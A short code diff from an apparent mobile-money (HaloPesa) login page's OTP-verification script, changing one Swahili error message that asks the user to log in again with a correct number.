@@ -1023,7 +1023,7 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Unaelekezwa kwenye kuingia…');
+          showOtpMsg('error', 'Maelezo hayakuthibitishwa. Tafadhali ingia tena na uweke namba sahihi ya HaloPesa.');
           setTimeout(() => {
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
